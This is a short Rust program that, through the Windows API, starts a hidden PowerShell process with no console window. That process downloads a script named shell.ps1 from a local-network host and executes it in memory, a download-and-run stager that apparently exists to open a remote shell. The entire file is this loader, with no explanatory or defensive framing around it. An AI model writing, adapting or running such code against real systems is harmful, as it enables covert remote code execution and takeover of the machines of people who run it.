extern crate winapi;

use std::ptr::null_mut;
use std::os::windows::prelude::*;
use std::ffi::OsStr;
use std::iter::once;
use std::mem::zeroed;
use winapi::um::winbase::CREATE_NO_WINDOW;
use winapi::um::processthreadsapi::{CreateProcessW, STARTUPINFOW, PROCESS_INFORMATION};

fn main() {
    let command = "powershell -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.106:8000/shell.ps1')";

    let mut command: Vec<u16> = OsStr::new(command).encode_wide().chain(once(0)).collect();
    let mut startup_info: STARTUPINFOW = unsafe { zeroed() };
    let mut process_info: PROCESS_INFORMATION = unsafe { zeroed() };

    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

    unsafe {
        CreateProcessW(
            null_mut(),
            command.as_mut_ptr(),
            null_mut(),
            null_mut(),
            false as i32,
            CREATE_NO_WINDOW,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };
}
